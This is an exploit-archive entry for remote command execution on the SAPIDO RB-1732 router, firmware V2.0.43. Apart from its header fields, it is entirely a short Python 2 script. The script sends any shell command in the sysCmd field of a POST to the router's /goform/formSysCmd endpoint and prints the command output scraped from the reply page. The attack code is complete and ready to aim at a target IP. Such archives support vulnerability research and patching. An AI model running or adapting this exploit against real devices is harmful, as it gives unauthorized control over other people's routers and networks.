# Exploit Title: SAPIDO RB-1732 command line execution
# Date: 2019-6-24
# Exploit Author: k1nm3n.aotoi
# Vendor Homepage: http://www.sapido.com.tw/
# Software Link: http://www.sapido.com.tw/CH/data/Download/firmware/rb1732/tc/RB-1732_TC_v2.0.43.bin
# Version: RB-1732 V2.0.43 
# Tested on: linux

 
import requests
import sys
 
def test_httpcommand(ip, command):
   my_data = {'sysCmd': command, 'apply': 'Apply', 'submit-url':'/syscmd.asp', 'msg':''}
   r = requests.post('http://%s/goform/formSysCmd' % ip, data = my_data)
   content = r.text
   content = content[
     content.find('<textarea rows="15" name="msg" cols="80" wrap="virtual">')+56:
     content.rfind('</textarea>')]
   return content
 
print test_httpcommand(sys.argv[1], " ".join(sys.argv[2:]))